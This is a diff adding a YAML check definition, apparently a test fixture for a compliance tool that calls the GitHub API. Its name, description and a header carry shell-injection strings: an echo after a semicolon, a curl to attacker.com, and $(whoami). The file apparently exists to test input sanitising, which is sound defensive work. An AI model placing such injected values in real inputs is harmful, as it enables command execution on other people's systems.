@@ -1,0 +1,26 @@
+id: TEST-1
+name: Test; echo "pwned" #
+description: "Test with shell chars'; curl attacker.com"
+source: github
+profile: L1
+credentials:
+  GITHUB_TOKEN:
+    type: api_token
+    required: true
+inputs:
+  org:
+    description: Org name
+    env: GITHUB_ORG
+    required: true
+steps:
+  - id: test
+    action: api_call
+    request:
+      method: GET
+      url: "https://api.github.com/orgs/{{org}}"
+      headers:
+        Authorization: "Bearer {{GITHUB_TOKEN}}"
+        X-Custom: "$(whoami)"
+assertions: []
+references:
+  soc2: CC6.1
